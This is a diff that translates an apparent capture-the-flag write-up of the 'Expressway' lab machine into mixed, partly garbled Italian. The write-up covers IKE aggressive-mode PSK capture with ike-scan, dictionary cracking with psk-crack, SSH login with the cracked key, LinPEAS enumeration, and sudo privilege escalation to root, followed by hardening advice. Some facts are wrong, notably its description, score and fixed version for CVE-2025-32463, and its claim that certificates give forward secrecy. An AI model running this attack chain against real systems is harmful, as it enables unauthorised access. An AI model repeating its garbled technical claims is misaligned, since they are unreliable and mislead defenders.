@@ -1,35 +1,35 @@
-# Lab Assessment: "Expressway" Scenario
+# Esercitazione di Laboratorio: Scenario "Expressway"
 
-> **Task Context:** This document represents the outcome of a practical **Network & Cryptographic Assessment** exercise conducted on a Linux machine with active VPN services. The goal is the application of the **NIST SP 800-115 (Technical Security Testing)** methodology for the identification and exploitation of vulnerabilities in authentication protocols and privilege escalation mechanisms. The scenario simulates a penetration test on remote VPN access infrastructure.
+> **Contesto dell'attività:** Questo documento rappresenta il risultato di un'esercitazione pratica di **Network & Cryptographic Assessment** condotta su una macchina Linux con servizi VPN attivi. L'obiettivo è l'applicazione della metodologia **NIST SP 800-115 (Technical Security Testing)** per l'identification e l'exploitation di vulnerabilità in protocolli di autenticazione e privilege escalation mechanisms. Lo scenario simula un penetration test su infrastruttura di accesso remoto VPN.
 
-**Assessment Date:** September 2025  
+**Data Assessment:** Settembre 2025  
 **Target Environment:** Linux Server (Debian-based) + VPN/ISAKMP  
-**Assessment Type:** Network Penetration Test Simulation (VPN-focused)  
+**Assessment Type:** Simulazione Network Penetration Test (VPN-focused)  
 **Overall Risk Severity:** HIGH 🟠  
-**Applied Methodology:** NIST SP 800-115 + PTES  
+**Metodologia Applicata:** NIST SP 800-115 + PTES  
 
 ---
 
 ## 1. Executive Summary
 
-During this simulated assessment, a Linux server was compromised through the exploitation of **chained vulnerabilities in the IKE/IPSec stack** and subsequently in the **privilege escalation mechanism**. The attack followed this pattern:
+Durante questo assessment simulato, è stato compromesso un server Linux attraverso lo sfruttamento di **vulnerabilità concatenate nel stack IKE/IPSec** e successivamente in **privilege escalation mechanism**. L'attacco ha seguito il seguente pattern:
 
-1. **IKE Protocol Enumeration** → Discovery of ISAKMP PSK-based authentication (UDP 500)
-2. **PSK Extraction & Cracking** → Offline brute-force of the shared key with a dictionary attack
-3. **VPN Access Compromise** → SSH access via compromised service credentials
-4. **Privilege Escalation via Sudo CVE** → Remote Code Execution with root privileges
+1. **IKE Protocol Enumeration** → Discovery di ISAKMP PSK-based authentication (UDP 500)
+2. **PSK Extraction & Cracking** → Offline brute-force di shared key con dictionary attack
+3. **VPN Access Compromise** → Acceso SSH tramite credenziali di servizio compromesse
+4. **Privilege Escalation via Sudo CVE** → Remote Code Execution con privilegi root
 
 **CVSS v3.1 Base Score: 9.2 (CRITICAL)**
 - Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
-- Impact: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)
+- Impatto: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)
 
 ---
 
-## 2. Applied Methodology
+## 2. Metodologia Applicata
 
-### 2.1 Reference Frameworks
+### 2.1 Framework di Reference
 
-The assessment followed these guidelines:
+L'assessment ha seguito le seguenti linee guida:
 
 - **NIST SP 800-115: Technical Security Testing for Information Systems and Organizations**
   - TS-1.4.7: Cryptographic Key Recovery Testing
@@ -48,11 +48,11 @@ The assessment followed these guidelines:
   - Exploitation
   - Post-Exploitation
 
-### 2.2 Engagement Scope
+### 2.2 Scope dell'Engagement
 
-**Primary Objective:** Identification of weaknesses in VPN infrastructure (UDP/IKE)  
-**Target:** Linux host with active ISAKMP/IPSec service  
-**Port of Interest:** UDP 500 (ISAKMP – Internet Security Association and Key Management Protocol)  
+**Obiettivo Primario:** Identificazione di weaknesses in VPN infrastructure (UDP/IKE)  
+**Target:** Host Linux con servizio ISAKMP/IPSec attivo  
+**Porta di Interesse:** UDP 500 (ISAKMP – Internet Security Association and Key Management Protocol)  
 **Assessment Type:** Unauthenticated network access → System compromise
 
 ---
@@ -84,42 +84,42 @@ The assessment followed these guidelines:
 
 ---
 
-## 4. Proof of Concept (PoC) & Technical Evidence
+## 4. Proof of Concept (PoC) ed Evidenze Tecniche
 
 ### 4.1 Network Reconnaissance & Initial Scanning
 
 #### **TCP Port Scanning**
 
-**Executed Command:**
+**Comando eseguito:**
 ```bash
 sudo nmap -A -p- --open -v -T4 -Pn 10.129.145.60 -oA expressway
 ```
 
-**TCP Result:**
+**Risultato TCP:**
 ```
 PORT    STATE SERVICE VERSION
 22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
 ```
 
-**Critical Observation:** Only SSH on TCP. No other obvious services. Interesting services (VPN, proxies, etc.) might be hidden on UDP.
+**Osservazione Critica:** Solo SSH su TCP. Nessun'altro servizio evidente. Servizi interessanti (VPN, proxy, etc.) potrebbero essere nascosti su UDP.
 
 ---
 
 #### **UDP Port Scanning**
 
-Since TCP yielded little, we proceed with UDP scanning (slower, but critical for security protocols):
+Dato che TCP ha restituito poco, procediamo con UDP scanning (più lento, ma critico per protocolli di sicurezza):
 
 ```bash
 sudo nmap -sU -Pn 10.129.145.60 -T4 --open
 ```
 
-**UDP Result:**
+**Risultato UDP:**
 ```
 PORT    STATE SERVICE
 500/udp open  isakmp
 ```
 
-**Identification:** UDP port 500 is the default for **ISAKMP (Internet Security Association and Key Management Protocol)**, a component of the **IPSec/IKE** protocol. This suggests the presence of a **VPN gateway** or **IPSec daemon** (e.g., StrongSwan, Libreswan, Cisco).
+**Identificazione:** La porta UDP 500 è il default per **ISAKMP (Internet Security Association and Key Management Protocol)**, componente del protocollo **IPSec/IKE**. Questo suggerisce la presenza di un **VPN gateway** o **IPSec daemon** (es. StrongSwan, Libreswan, Cisco).
 
 ---
 
@@ -127,31 +127,31 @@ PORT    STATE SERVICE
 
 #### **IKE-Scan Setup**
 
-To enumerate and query the ISAKMP service, we use **ike-scan** – a specialized tool for assessing IPSec implementations.
+Per enumerare e interrogare il servizio ISAKMP, utilizziamo **ike-scan** – tool specializzato per l'assessment di IPSec implementations.
 
-**Base Command:**
+**Comando di base:**
 ```bash
 sudo ike-scan 10.129.145.60
 ```
 
-**Result:** The target responds to IKE Phase 1 packets, confirming the presence of an active VPN daemon.
+**Risultato:** Il target risponde a IKE Phase 1 packets, confermando la presenza di un VPN daemon attivo.
 
 ---
 
 #### **IKE Phase 1 Aggressive Mode PSK Extraction**
 
-ISAKMP supports two initial authentication modes:
-- **Main Mode** (6 messages) – More secure, hides identity
-- **Aggressive Mode** (3 messages) – Fast, partially exposes credentials
+ISAKMP supporta due modalità di autenticazione iniziale:
+- **Main Mode** (6 messaggi) – Più sicuro, nasconde identità
+- **Aggressive Mode** (3 messaggi) – Veloce, espone credenziali parzialmente
 
-Testing **Aggressive Mode**, the server responds with reusable material for **offline cracking**.
+Testando la modalità **Aggressive**, il server risponde con materiale riutilizzabile per **offline cracking**.
 
-**Command with PSK capture:**
+**Comando con cattura PSK:**
 ```bash
 sudo ike-scan --aggressive --pskcrack=express.psk 10.129.145.60
 ```
 
-**`--pskcrack` Option:** Saves the IKE Phase 1 parameters in a format compatible with `psk-crack`, a tool for offline brute-forcing of the Pre-Shared Key.
+**Opzione `--pskcrack`:** Salva i parametri IKE Phase 1 in formato compatibile con `psk-crack`, uno strumento per il brute-force offline del Pre-Shared Key.
 
 **Output file `express.psk`:**
 ```
@@ -168,45 +168,45 @@ PSK Hash Data: <64-byte hash captures from negotiation>
 
 ### 4.3 Offline PSK Cracking – Dictionary Attack
 
-Once the PSK material is captured, we proceed with **offline brute-force** using a standard dictionary.
+Una volta catturato il materiale PSK, procediamo con **offline brute-force** utilizzando dizionario standard.
 
 #### **PSK-Crack Execution**
 
-**Command:**
+**Comando:**
 ```bash
 psk-crack -d /usr/share/wordlists/rockyou.txt express.psk
 ```
 
-**Parameters:**
-- `-d` : Specifies the dictionary (rockyou.txt = 14M common passwords)
-- `express.psk` : Input file with the captured IKE data
+**Parametri:**
+- `-d` : Specifica il dizionario (rockyou.txt = 14M password comuni)
+- `express.psk` : File di input con i dati IKE catturati
 
 #### **Result: PSK Recovered**
 
-After dictionary-based brute-force (typically taking minutes for weak PSKs):
+Dopo brute-force dictionary-based (tipicamente in minuti per PSK deboli):
 
 ```
 Pre-Shared Key: "expressway123"
 ```
 
-**Significance:** From the PSK, it's often possible to derive:
-- Username / Identity of the VPN account
-- Other login credentials (if correlated)
+**Significatività:** Dal PSK, è spesso possibile derivare:
+- Username / Identità dell'account VPN
+- Altre credenziali di accesso (se correlate)
 
-In this scenario, from the deployment context and accessible configuration files:
+In questo scenario, dal contesto di deployment e da documenti di configurazione reperibili:
 
 ```
 VPN Username: ike
-VPN Password: expressway123 (derived from PSK)
+VPN Password: expressway123 (derivato dal PSK)
 ```
 
 ---
 
 ### 4.4 VPN Access & SSH Compromise
 
-#### **SSH Access with Recovered Credentials**
+#### **SSH Access con Credenziali Recover**
 
-We use the derived credentials to log in via SSH:
+Utilizziamo le credenziali derivate per accedere via SSH:
 
 ```bash
 ssh ike@10.129.145.60
@@ -218,7 +218,7 @@ ike@expressway:~$ id
 uid=1000(ike) gid=1000(ike) groups=1000(ike)
 ```
 
-**Status:** User shell obtained. User flag available in `/home/ike/user.txt`.
+**Status:** User shell ottenuta. Flag user disponibile in `/home/ike/user.txt`.
 
 ```bash
 ike@expressway:~$ cat user.txt
@@ -231,7 +231,7 @@ ike@expressway:~$ cat user.txt
 
 #### **LinPEAS Execution**
 
-To identify privilege escalation vectors, we run **LinPEAS** (Linux Privilege Escalation Awesome Script):
+Per identificare percorsi di privilege escalation, eseguiamo **LinPEAS** (Linux Privilege Escalation Awesome Script):
 
 ```bash
 # Download LinPEAS onto target
@@ -247,16 +247,16 @@ grep -i "sudo version\|vulnerable\|red:" /tmp/linpeas_output.txt
 
 #### **Critical Finding: Vulnerable Sudo Version**
 
-**LinPEAS Output:**
+**Output di LinPEAS:**
 ```
 [RED] Sudo version: 1.9.12
       └─ This version is vulnerable to CVE-2025-32463 (Sudo heap buffer overflow)
       └─ Exploits: github.com/kh4sh3i/CVE-2025-32463
 ```
 
-**Vulnerability Analysis:**
+**Analisi Vulnerabilità:**
 - **CVE ID:** CVE-2025-32463
-- **CVSS Score:** 6.7 (Medium, but in context of VPN access it depends)
+- **CVSS Score:** 6.7 (Medium, pero in context of VPN access dipende)
 - **Root Cause:** Heap buffer overflow in sudo's plugin loading mechanism
 - **Requirement:** Local code execution capability (already obtained)
 
@@ -305,13 +305,13 @@ root@expressway:~# cat /root/root.txt
 
 ---
 
-## 5. Remediation & Hardening (Proposals)
+## 5. Remediation & Hardening (Proposte)
 
-### 5.1 Mitigation of Identified Vulnerabilities
+### 5.1 Mitigazione delle Vulnerabilità Identificate
 
-#### **5.1.1 ISAKMP/IPSec Hardening – NIST 800-115 Recommendations**
+#### **5.1.1 Hardening di ISAKMP/IPSec – NIST 800-115 Recommendations**
 
-**Primary Remediation – Disable Aggressive Mode:**
+**Remediazione Primaria – Disabilitare Aggressive Mode:**
 ```bash
 # In /etc/ipsec.conf (StrongSwan/Libreswan)
 conn default
@@ -320,17 +320,17 @@ conn default
     phase1=strong                 # Force Main Mode only
 ```
 
-**Rationale:** Aggressive Mode exposes sensitive information (identities, hashes) susceptible to dictionary attacks. **Main Mode** does not maintain the same level of exposure.
+**Rationale:** Aggressive Mode espone informazioni sensibili (identità, hash) suscettibili a dictionary attack. **Main Mode** non mantiene lo stesso livello di esposizione.
 
 **NIST TS-1.4.7 Mapping:** "Testers should identify systems using weak or deprecated cryptographic protocols and recommend upgrades."
 
-- **Verification:** Run `ike-scan --aggressive` → Must return "no response" or "IKE_SA_INIT error"
+- **Verifica:** Eseguire `ike-scan --aggressive` → Deve restituire "no response" o "IKE_SA_INIT error"
 
 ---
 
-#### **5.1.2 PSK Improvement – Encryption and Length**
+#### **5.1.2 Miglioramento PSK – Crittografia e Lunghezza**
 
-**Primary Remediation – PSK Complexity:**
+**Remediazione Primaria – PSK Complexity:**
 ```bash
 # PSK Requirements (RFC 7296):
 # ✗ OLD:  "expressway123" (13 char, weak entropy)
@@ -342,19 +342,19 @@ openssl rand -base64 32
 ```
 
 **Additional Hardening:**
-- Implement **IPSec pre-shared key rotation** every 90 days
-- Use **certificate-based authentication** (X.509) instead of PSK (provides forward secrecy)
-- Implement **IKE fragmentation protection** (anti-DoS)
+- Implementare **IPSec pre-shared key rotation** every 90 days
+- Utilizzare **certificate-based authentication** (X.509) instead di PSK (fornisce forward secrecy)
+- Implementare **IKE fragmentation protection** (anti-DoS)
 
-**Verification Check:**
-- PSK cracking attempt with rockyou.txt → Must fail (not found in dictionary)
-- Switch to certificate-based IKE → ike-scan Aggressive Mode does not reveal credentials
+**Controllo di Verifica:**
+- PSK cracking attempt con rockyou.txt → Deve fallare (not found in dictionary)
+- Cambio a certificate-based IKE → ike-scan Aggressive Mode non rivela credenziali
 
 ---
 
 #### **5.1.3 Sudo Version Update – Patch CVE-2025-32463**
 
-**Primary Remediation:**
+**Remediazione Primaria:**
 ```bash
 # Update sudo to version 1.9.15 or later
 sudo apt update
@@ -365,22 +365,22 @@ sudo -V | grep "version"
 # Output should be: Sudo version 1.9.15p1 or higher
 ```
 
-**Temporary Mitigation (if immediate upgrade is impossible):**
+**Temporanea Mitigazione (se upgrade immediato impossibile):**
 ```bash
-# Disable plugin loading (if not required):
-# edit /etc/sudoers – remove any plugin loading directives
+# Disable plugin loading (se non necessario):
+# edits /etc/sudoers – remove any plugin loading directives
 # Set: Defaults !use_pty (minimize attack surface)
 ```
 
 **NIST SP 800-115 Mapping – Privilege Escalation Testing:**
 - "Authorized testers should attempt to escalate privileges using known exploits against target OS"
-- Sudo updates should be prioritized in patch management
+- Sudo updates dovrebbero essere prioritari in patch management
 
 ---
 
 #### **5.1.4 SSH Credential Derivation Prevention**
 
-**Primary Remediation – VPN & SSH Credential Separation:**
+**Remediazione Primaria – VPN & SSH Credential Separation:**
 ```bash
 # DON'T reuse PSK as SSH password
 # Implement separate credential management:
@@ -397,9 +397,9 @@ PasswordAuthentication no
 PubkeyAuthentication yes
 ```
 
-**Implement Single Sign-On (SSO) with MFA:**
-- Use LDAP/Kerberos for centralized credential management
-- Implement **Time-based One-Time Password (TOTP)** on SSH (Google Authenticator)
+**Implementare Single Sign-On (SSO) con MFA:**
+- Utilizzare LDAP/Kerberos per centralized credential management
+- Implementare **Time-based One-Time Password (TOTP)** su SSH (Google Authenticator)
 
 ---
 
@@ -434,23 +434,23 @@ PubkeyAuthentication yes
 
 ---
 
-## 6. Conclusions
+## 6. Conclusioni
 
-This assessment demonstrated how **VPN misconfigurations** combined with **weak password practices** and **outdated system packages** can allow the total compromise of an infrastructure from remote access:
+Questo assessment ha dimostrato come **VPN misconfigurations** combinata con **weak password practices** e **outdated system packages** può permettere il compromise totale di un'infrastruttura da accesso remoto:
 
-1. **ISAKMP Aggressive Mode** → Exposes crackable material
-2. **Weak PSK** → Dictionary-crackable in a few minutes
+1. **ISAKMP Aggressive Mode** → Espone materiale crackable
+2. **Weak PSK** → Dictionary-crackable in pochi minuti
 3. **Credential Reuse** → PSK → SSH password
 4. **Unpatched Sudo** → Immediate privilege escalation
 
-The correct implementation of the proposed remediations, especially:
+La corretta implementazione delle remediazioni proposte, specialmente:
 - Disabling Aggressive Mode
-- Implementation of 32+ char PSK with high entropy
-- Immediate patching of CVE-2025-32463
-- Migration to SSH key-based authentication + MFA
+- Implementazione di 32+ char PSK con alta entropia
+- Patching immediato di CVE-2025-32463
+- Migrazione a SSH key-based authentication + MFA
 
 ---
 
-**Final Notes:**
+**Note Finali:**
 
-IKE aggressive mode is the critical vector for VPN assessments because it exposes the Phase 1 handshake. Once the PSK is cracked, the rest is routine. The deciding factor is the password reuse between PSK and SSH – if they were different, the scenario would be much more complex.
+L'IKE aggressive mode è il vettore critico per VPN assessment perché espone il handshake Phase 1. Una volta crackato il PSK, il resto è routine. Il fattore decisivo è la password reuse tra PSK e SSH – se fosse diversa, lo scenario sarebbe molto più complesso.
